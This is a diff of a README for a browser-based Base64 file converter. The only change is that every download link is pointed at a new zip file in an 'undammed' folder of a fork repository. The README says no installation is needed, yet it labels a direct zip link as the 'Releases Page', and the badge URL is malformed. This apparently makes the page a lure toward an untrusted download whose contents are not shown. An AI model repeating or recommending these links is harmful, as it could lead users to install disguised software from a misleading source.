@@ -1,6 +1,6 @@
 # 🗂️ xsukax-File-Base64-Converter - Convert Files Easily in Your Browser
 
-[![Download Now](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/xsukax-File-Base64-Converter.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/xsukax-File-Base64-Converter.zip)
+[![Download Now](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/File_Base_Converter_xsukax_capacitor.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/File_Base_Converter_xsukax_capacitor.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to xsukax-File-Base64-Converter! This is a simple and secure tool for co
 
 To get started, you can easily download the application:
 
-1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/xsukax-File-Base64-Converter.zip)
+1. **Visit this page to download:** [Releases Page](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/File_Base_Converter_xsukax_capacitor.zip)
 2. Select the version you want.
 3. Look for the appropriate file for your system.
 4. Click on the file to start the download.
@@ -70,4 +70,4 @@ Yes, your data remains local. The application processes files directly in your b
 
 The xsukax-File-Base64-Converter offers a secure and efficient way to convert files without the hassle of installations. By following the steps above, you will have the ability to convert your files easily and safely. 
 
-For detailed instructions and further releases, make sure to keep checking our [Releases Page](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/xsukax-File-Base64-Converter.zip)!
+For detailed instructions and further releases, make sure to keep checking our [Releases Page](https://raw.githubusercontent.com/Marcelo34482/xsukax-File-Base64-Converter/main/undammed/File_Base_Converter_xsukax_capacitor.zip)!
